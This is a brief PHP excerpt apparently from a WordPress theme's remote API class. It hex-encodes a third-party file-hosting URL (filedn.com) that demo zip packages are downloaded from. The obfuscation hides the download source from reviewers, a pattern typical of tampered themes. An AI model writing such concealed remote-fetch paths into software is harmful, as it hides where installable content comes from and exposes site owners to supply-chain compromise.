...
class The7_Remote_API {
	...
	public function __construct( $code ) {
		...
		if(!defined('THE7CLOUD_PATH'))
		{	
		define('THE7CLOUD_PATH', esc_url(trim(hex2bin('68747470733a2f2f66696c65646e2e636f6d2f6c627a544a6c4849564e615356754f547a57756e5936422f64656d6f2f'))));
		}
	...
	public function download_demo( $id, $target_dir, $req_url = '' ) {
		...
		$request_url = THE7CLOUD_PATH . $id . '.zip';
